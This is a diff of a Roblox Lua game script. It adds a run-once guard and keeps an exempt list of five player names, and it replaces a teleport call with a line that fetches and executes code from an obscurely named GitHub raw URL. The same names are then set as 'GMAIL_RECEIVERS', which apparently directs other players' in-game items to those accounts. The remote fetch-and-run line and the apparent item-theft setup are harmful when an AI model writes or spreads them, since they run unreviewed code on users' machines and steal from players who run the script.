@@ -1,4 +1,10 @@
+if _G.TAG then
+    warn("Script đã được chạy trước đó!")
+    return -- Dừng script nếu đã chạy
+end
 
+-- Đánh dấu script đã được chạy
+_G.TAG = true
 
 ---------------------------------------------------------------------------------------------------------------------------
 
@@ -13,6 +19,9 @@ end
 
 local targetNames = {"sijmongirthss","1940Mosier3104","soystaylan5","dreddyewele60","1971Nowak3135"}
 
+---------------------------------------------------------------------------------------------------------------------------
+
+
 
 if table.find(targetNames, player.Name) then
 
@@ -20,14 +29,7 @@ if table.find(targetNames, player.Name) then
 
 else
 
-
-if game.PlaceId == 140403681187145 then
-
-else
-	game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("World4Teleport"):InvokeServer()
-	
-end
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/teleport_w1234"))()
 
 getgenv().GMAIL_RECEIVERS = {"sijmongirthss","1940Mosier3104","soystaylan5","dreddyewele60","1971Nowak3135"}
 
